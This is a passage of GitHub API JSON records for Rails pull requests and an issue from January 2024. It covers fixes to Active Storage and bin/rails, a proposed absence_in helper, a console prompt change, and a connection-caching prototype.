        "body": "### Motivation / Background\r\n\r\nThis is a fix needed to unblock https://github.com/rails/rails/pull/50284, because Active Storage relies on a Active Record bug.\r\n\r\n### Detail\r\n\r\nThe problem is best understood with a small snippet:\r\n\r\n```ruby\r\nblob = ActiveStorage::Blob.new\r\n\r\nActiveStorage::Attachment.new(blob: blob)\r\nActiveStorage::Attachment.new(blob: blob)\r\n\r\n# Currently:\r\np blob.attachments #=> #<ActiveRecord::Associations::CollectionProxy []>\r\n\r\n# Once the Active Record bug is fixed:\r\np blob.attachments #=> #<ActiveRecord::Associations::CollectionProxy [#<ActiveStorage::Attachment id: nil, name: nil, record_type: nil, record_id: nil, blob_id: nil, created_at: nil>, #<ActiveStorage::Attachment id: nil, name: nil, record_type: nil, record_id: nil, blob_id: nil, created_at: nil>]>\r\n\r\n# Saving the blob would result in trying to create 2 attachments which\r\n# fails because of unique constraints.\r\n```\r\n\r\n### Additional information\r\n\r\nThe real code path that does what the snippet above does is located here:\r\n\r\nhttps://github.com/rails/rails/blob/9c3ffab47c3bf59320ba08e9dafdb0275cf91a5a/activestorage/lib/active_storage/attached/many.rb#L52\r\n\r\nIt's basically doing this:\r\n\r\n```ruby\r\nuser.images.attach \"photo1.png\"\r\n# Initialize a Blob record and an Attachment\r\n\r\nuser.images.attach \"photo2.png\"\r\n# Get the Blob from above, create another Attachment\r\n# Initialize a new Blob record and an new Attachment\r\n\r\n# Rinse and repeat every time `attach` is called\r\n```\r\n\r\n### Solution\r\n\r\n- Explicitly set the `inverse_of`, so that it behaves as if #50284 is shipped\r\n- Don't build a new attachment for blob already having one.\r\n\r\n### Tests\r\n\r\nI didn't add tests, the test suite is already well covered, adding the `inverse_of`\r\nwithout any changes breaks the test suite already. You can try by running\r\nfor instance the `activestorage/test/models/attached/many_test.rb`.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50800/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50800/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50799",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50799/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50799/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50799/events",
        "html_url": "https://github.com/rails/rails/pull/50799",
        "id": 2089321938,
        "node_id": "PR_kwDNIULOZHsDrQ",
        "number": 50799,
        "title": "Fix `bin/rails -T` when no default task is defined",
        "user": {
            "login": "jonathanhefner",
            "id": 771968,
            "node_id": "MDQ6VXNlcjc3MTk2OA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/771968?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jonathanhefner",
            "html_url": "https://github.com/jonathanhefner",
            "followers_url": "https://api.github.com/users/jonathanhefner/followers",
            "following_url": "https://api.github.com/users/jonathanhefner/following{/other_user}",
            "gists_url": "https://api.github.com/users/jonathanhefner/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jonathanhefner/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jonathanhefner/subscriptions",
            "organizations_url": "https://api.github.com/users/jonathanhefner/orgs",
            "repos_url": "https://api.github.com/users/jonathanhefner/repos",
            "events_url": "https://api.github.com/users/jonathanhefner/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jonathanhefner/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-19T00:11:33Z",
        "updated_at": "2024-01-19T00:43:18Z",
        "closed_at": "2024-01-19T00:43:18Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50799",
            "html_url": "https://github.com/rails/rails/pull/50799",
            "diff_url": "https://github.com/rails/rails/pull/50799.diff",
            "patch_url": "https://github.com/rails/rails/pull/50799.patch",
            "merged_at": "2024-01-19T00:43:18Z"
        },
        "body": "When Rake parses an argument string with no tasks, it sets the top-level task as \"default\".  Prior to this commit, if no default task was defined (for example, if an app was generated with `--skip-test` and didn't define its own default task), `Rails::Command::RakeCommand` would raise `UnrecognizedCommandError`, preventing Rake from displaying the task list.\r\n\r\nThis commit changes `Rails::Command::RakeCommand` to let Rake handle the \"default\" task.\r\n\r\nFixes #50700.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50799/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50799/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50798",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50798/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50798/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50798/events",
        "html_url": "https://github.com/rails/rails/pull/50798",
        "id": 2089308071,
        "node_id": "PR_kwDNIULOZHrTag",
        "number": 50798,
        "title": "Print `bin/rails` help on unrecognized bare options",
        "user": {
            "login": "jonathanhefner",
            "id": 771968,
            "node_id": "MDQ6VXNlcjc3MTk2OA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/771968?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jonathanhefner",
            "html_url": "https://github.com/jonathanhefner",
            "followers_url": "https://api.github.com/users/jonathanhefner/followers",
            "following_url": "https://api.github.com/users/jonathanhefner/following{/other_user}",
            "gists_url": "https://api.github.com/users/jonathanhefner/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jonathanhefner/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jonathanhefner/subscriptions",
            "organizations_url": "https://api.github.com/users/jonathanhefner/orgs",
            "repos_url": "https://api.github.com/users/jonathanhefner/repos",
            "events_url": "https://api.github.com/users/jonathanhefner/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jonathanhefner/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-18T23:57:15Z",
        "updated_at": "2024-01-25T17:36:00Z",
        "closed_at": "2024-01-19T00:10:23Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50798",
            "html_url": "https://github.com/rails/rails/pull/50798",
            "diff_url": "https://github.com/rails/rails/pull/50798.diff",
            "patch_url": "https://github.com/rails/rails/pull/50798.patch",
            "merged_at": "2024-01-19T00:10:23Z"
        },
        "body": "Prior to this commit, `bin/rails` would pass unrecognized bare options on to Rake:\r\n\r\n  ```console\r\n  $ bin/rails -v\r\n  Rails 7.2.0.alpha\r\n\r\n  $ bin/rails -V\r\n  rake, version 13.0.6\r\n\r\n  $ bin/rails -s\r\n  Running 0 tests in a single process (parallelization threshold is 50)\r\n  ...\r\n\r\n  $ bin/rails -S\r\n  invalid option: -S\r\n  ```\r\n\r\nThis commit changes `bin/rails` to print its help message when given an unrecognized bare option:\r\n\r\n  ```console\r\n  $ bin/rails -v\r\n  Rails 7.2.0.alpha\r\n\r\n  $ bin/rails -V\r\n  Usage:\r\n    bin/rails COMMAND [options]\r\n\r\n  You must specify a command. The most common commands are:\r\n  ...\r\n\r\n  $ bin/rails -s\r\n  Usage:\r\n    bin/rails COMMAND [options]\r\n\r\n  You must specify a command. The most common commands are:\r\n  ...\r\n\r\n  $ bin/rails -S\r\n  Usage:\r\n    bin/rails COMMAND [options]\r\n\r\n  You must specify a command. The most common commands are:\r\n  ...\r\n  ```\r\n\r\nHowever, for backward compatibility, an exception has been made for the `-T` / `--tasks` option:\r\n\r\n  ```console\r\n  $ bin/rails -T\r\n  # Prints list of Rake tasks...\r\n  ```\r\n\r\nAddresses #50712.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50798/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50798/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50797",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50797/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50797/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50797/events",
        "html_url": "https://github.com/rails/rails/pull/50797",
        "id": 2089290493,
        "node_id": "PR_kwDNIULOZHqTNw",
        "number": 50797,
        "title": "Implement `Object#absence_in` ActiveSupport core extension method",
        "user": {
            "login": "viralpraxis",
            "id": 39729785,
            "node_id": "MDQ6VXNlcjM5NzI5Nzg1",
            "avatar_url": "https://avatars.githubusercontent.com/u/39729785?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/viralpraxis",
            "html_url": "https://github.com/viralpraxis",
            "followers_url": "https://api.github.com/users/viralpraxis/followers",
            "following_url": "https://api.github.com/users/viralpraxis/following{/other_user}",
            "gists_url": "https://api.github.com/users/viralpraxis/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/viralpraxis/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/viralpraxis/subscriptions",
            "organizations_url": "https://api.github.com/users/viralpraxis/orgs",
            "repos_url": "https://api.github.com/users/viralpraxis/repos",
            "events_url": "https://api.github.com/users/viralpraxis/events{/privacy}",
            "received_events_url": "https://api.github.com/users/viralpraxis/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-18T23:44:48Z",
        "updated_at": "2024-01-19T10:10:14Z",
        "closed_at": "2024-01-19T10:10:13Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50797",
            "html_url": "https://github.com/rails/rails/pull/50797",
            "diff_url": "https://github.com/rails/rails/pull/50797.diff",
            "patch_url": "https://github.com/rails/rails/pull/50797.patch",
            "merged_at": null
        },
        "body": "Method `absence_in` complements existing `presence_in` and can be used to check for absence on the blacklist .\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nExisting method `Object#presence_in` can be used for whilelisting:\r\n\r\n```ruby\r\ndef page_title\r\n  params[:page_title].presence_in(%w[photos videos]) || \"photos\"\r\nend\r\n```\r\n\r\nHowever, sometimes sometimes it is important to check for absence on the blacklist rather than whilelist inclusion:\r\n\r\n```ruby\r\ndef page_title\r\n  params[:page_title].absence_in(%w[default hidden]) || \"photos\"\r\nend\r\n```\r\n\r\nSeems like this method does not add any additional complexity. I also wasn't able to come up with a clean, short and good-looking alternative based on existing methods (tell me if I'm missing something!).\r\n  \r\n### Detail\r\n\r\nThis PR adds implementation for `Object#absence_in` ActiveSupport core extension.\r\n\r\n### Checklist\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50797/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50797/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50796",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50796/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50796/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50796/events",
        "html_url": "https://github.com/rails/rails/pull/50796",
        "id": 2089217366,
        "node_id": "PR_kwDNIULOZHmHhw",
        "number": 50796,
        "title": "Add customized prompt for Rails console",
        "user": {
            "login": "st0012",
            "id": 5079556,
            "node_id": "MDQ6VXNlcjUwNzk1NTY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5079556?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/st0012",
            "html_url": "https://github.com/st0012",
            "followers_url": "https://api.github.com/users/st0012/followers",
            "following_url": "https://api.github.com/users/st0012/following{/other_user}",
            "gists_url": "https://api.github.com/users/st0012/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/st0012/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/st0012/subscriptions",
            "organizations_url": "https://api.github.com/users/st0012/orgs",
            "repos_url": "https://api.github.com/users/st0012/repos",
            "events_url": "https://api.github.com/users/st0012/events{/privacy}",
            "received_events_url": "https://api.github.com/users/st0012/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-18T23:00:43Z",
        "updated_at": "2024-01-26T23:01:34Z",
        "closed_at": "2024-01-19T19:11:51Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50796",
            "html_url": "https://github.com/rails/rails/pull/50796",
            "diff_url": "https://github.com/rails/rails/pull/50796.diff",
            "patch_url": "https://github.com/rails/rails/pull/50796.patch",
            "merged_at": "2024-01-19T19:11:51Z"
        },
        "body": "\r\n**Update**\r\n\r\nThere were 2 more follow up PRs on this:\r\n\r\n- https://github.com/rails/rails/pull/50825\r\n- https://github.com/rails/rails/pull/50855\r\n\r\nSo the resulted prompt now looks like this instead:\r\n\r\n![Screenshot 2024-01-26 at 23 00 56](https://github.com/rails/rails/assets/5079556/36359953-e0dc-4f76-aa97-e27a914be721)\r\n\r\n### Motivation / Background\r\n\r\nAs discussed in #50770, Rails console's prompt is not easily distinguishable from normal IRB console. It also doesn't provide Rails-specific information to assist developers.\r\n\r\nCloses #50770 \r\n\r\n### Detail\r\n\r\n- A new IRB prompt called `RAILS_PROMPT` is added, which looks like:\r\n    - `dev:001>` in development\r\n    - `prod:001>` in production\r\n    - `test:001>` in test\r\n- The `RAILS_PROMPT` is only selected when the user doesn't specify another custom prompt.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50796/reactions",
            "total_count": 23,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 21,
            "confused": 0,
            "heart": 0,
            "rocket": 1,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50796/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50794",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50794/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50794/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50794/events",
        "html_url": "https://github.com/rails/rails/pull/50794",
        "id": 2088747388,
        "node_id": "PR_kwDNIULOZHMUWg",
        "number": 50794,
        "title": "[Tests only] Expand trigger populated PK test case to run against more DBs",
        "user": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-18T17:27:12Z",
        "updated_at": "2024-01-18T18:43:34Z",
        "closed_at": "2024-01-18T18:17:01Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50794",
            "html_url": "https://github.com/rails/rails/pull/50794",
            "diff_url": "https://github.com/rails/rails/pull/50794.diff",
            "patch_url": "https://github.com/rails/rails/pull/50794.patch",
            "merged_at": "2024-01-18T18:17:01Z"
        },
        "body": "Follow-up for https://github.com/rails/rails/pull/50783\r\n\r\nI realized that I unnecessarily limited one of the tests to postgresql while the fix should be applicable to any database that supports `RETURNING` statement. \r\n\r\nSadly I couldn't come up with a proper setup for sqlite since it looks like there is no way of updating `NEW` record columns before insert in a trigger. So if someone has ideas on how to setup an sqlite trigger to generate `id` column value before insert - the test case can be tested against sqlite. But for now it technically means we will be testing it on MariaDB in addition to postgresql ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50794/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50794/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50793",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50793/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50793/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50793/events",
        "html_url": "https://github.com/rails/rails/pull/50793",
        "id": 2088694143,
        "node_id": "PR_kwDNIULOZHJaNQ",
        "number": 50793,
        "title": "PoC: Add an option to disable connection checkout caching",
        "user": {
            "login": "byroot",
            "id": 44640,
            "node_id": "MDQ6VXNlcjQ0NjQw",
            "avatar_url": "https://avatars.githubusercontent.com/u/44640?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/byroot",
            "html_url": "https://github.com/byroot",
            "followers_url": "https://api.github.com/users/byroot/followers",
            "following_url": "https://api.github.com/users/byroot/following{/other_user}",
            "gists_url": "https://api.github.com/users/byroot/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/byroot/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/byroot/subscriptions",
            "organizations_url": "https://api.github.com/users/byroot/orgs",
            "repos_url": "https://api.github.com/users/byroot/repos",
            "events_url": "https://api.github.com/users/byroot/events{/privacy}",
            "received_events_url": "https://api.github.com/users/byroot/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 20,
        "created_at": "2024-01-18T16:54:17Z",
        "updated_at": "2024-02-23T10:41:14Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": true,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50793",
            "html_url": "https://github.com/rails/rails/pull/50793",
            "diff_url": "https://github.com/rails/rails/pull/50793.diff",
            "patch_url": "https://github.com/rails/rails/pull/50793.patch",
            "merged_at": null
        },
        "body": "### Context\r\n\r\nIn part for performance and simplicity reasons, and in part because of its historical lack of threading support, Active Record rely quite heavily on `ActiveRecord::Base.connection` checking out and holding a connection inside a thread of fiber local variable.\r\n\r\nConcretly, every request or job lazily checkout connections when it needs to perform a database operations, and then holds onto it until the request or job completes, at which point the `Executor` hook automatically check it back in the pool.\r\n\r\nFor the overwhelming majority of Rails application, which don't do enough IOs to benefit from more than a handful of threads, it's a perfectly adequate solution, as it pretty much remove connection management as a concern.\r\n\r\nHowever for applications that spent most of their time on IOs others than the database (e.g. 3rd party APIs), and would benefit from much higher levels of concurrency, this strategy is problematic because it requires about as many database connections as there is threads or fibers, even though most connections are idle but can't be used because they checked out of the pool and held by another thead or fiber.\r\n\r\n### Goal\r\n\r\nI believe the current model is still preferable for the vast majority of Rails users, and changing the way `ActiveRecord::Base.connection` behaves would break a ton of code anyway. So I believe it should remain the default.\r\n\r\nHowever I think we could support an alternative mode, in which `ActiveRecord::Base.connection` doesn't hold onto the connection until the end of the request cycle, but instead immediately check it back in, allowing it to be re-used immediately.\r\n\r\n### Implementation\r\n\r\nFirst, nothing changes unless you disable `ActiveRecord.cache_connection_checkout`.\r\n\r\nThen, since a lot of code in Rails itself, in third party libraries, and in private Rails applications do rely on `Model.connection.something()`, we must make it work without caching the connection.\r\n\r\nTo solve this, when caching is disabled, `Model.connection` returns a proxy object, that delegates the methods it receive to a freshly checked out connection, and then check it back in. See `LazyConnectionProxy` in `connection_pool.rb` for the details.\r\n\r\nThat is the key to permitting this feature while retaining backward compatibility. It's not perfect, as code might assume that subsequent calls to `Model.connection` will return the same connection instance, but in most case it's not necessary.\r\n\r\nAlso, while the proxy holds the connection, it caches in on the thread or fiber, so subsequent calls to `Model.connection` will return the same connection until it's checked back in. This solves most of the statefulness issues, like opening a transaction etc, as long as the APIs are blocked based.\r\n\r\n### Status\r\n\r\nThis is a proof of concept, it's nowhere near ready to merge, it's mostly to explore whether it's doable with some work, or just not possible.\r\n\r\nMost of the Active Record test suite passes against Sqlite3, except for 3 tests that do disconnect and reconnect. In general all the tests had to be opted out of the feature, I still need to dig into why exactly.\r\n\r\nI also had to disable the feature for a few test suites that rely too much on the caching, and would need a bit of refactoring to pass without, but at first glance it doesn't look like a fundamental incompatibility.\r\n\r\n### Concerns\r\n\r\nThere is a number of Active Record methods that currently cause more than one checkout/checkin cycle and would benefit from a strategically placed `with_connection do` call to optimize that. But that is mostly a performance concern, not a fundamental incompatibility.\r\n\r\nOne more major concern is the query cache. As it stand it's pretty much useless when checkout caching is disabled, because when we check the connection back in, we have to clear the cache, so it's pretty much always empty. To make it usable again, we need a substantial refactoring. At first glance it looks possible, just not trivial.\r\n\r\n### Conclusion\r\n\r\nI'm a bit on the fence about this. I think we can make it work, but I already spent most of one day on just the proof of concept, and would need substantially more work to iron out all the issues.\r\n\r\nThe actual code changes needed in Active Record itself are relatively small, it's really all the test suite and 3rd party code that would need to be updated to properly work with this option that is the big can of worm I'm worried about.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50793/reactions",
            "total_count": 4,
            "+1": 4,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50793/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50792",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50792/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50792/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50792/events",
        "html_url": "https://github.com/rails/rails/issues/50792",
        "id": 2088620752,
        "node_id": "I_kwDNIULOfH3S0A",
        "number": 50792,
        "title": "`app:update` from Rails 7.1.2 to 7.1.3 creates `new_framework_defaults_7_1.rb`",
        "user": {
            "login": "GitToTheHub",
            "id": 13721821,
            "node_id": "MDQ6VXNlcjEzNzIxODIx",
            "avatar_url": "https://avatars.githubusercontent.com/u/13721821?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/GitToTheHub",
            "html_url": "https://github.com/GitToTheHub",
            "followers_url": "https://api.github.com/users/GitToTheHub/followers",
            "following_url": "https://api.github.com/users/GitToTheHub/following{/other_user}",
            "gists_url": "https://api.github.com/users/GitToTheHub/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/GitToTheHub/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/GitToTheHub/subscriptions",
            "organizations_url": "https://api.github.com/users/GitToTheHub/orgs",
            "repos_url": "https://api.github.com/users/GitToTheHub/repos",
            "events_url": "https://api.github.com/users/GitToTheHub/events{/privacy}",
            "received_events_url": "https://api.github.com/users/GitToTheHub/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-18T16:15:11Z",
        "updated_at": "2024-01-19T09:40:06Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
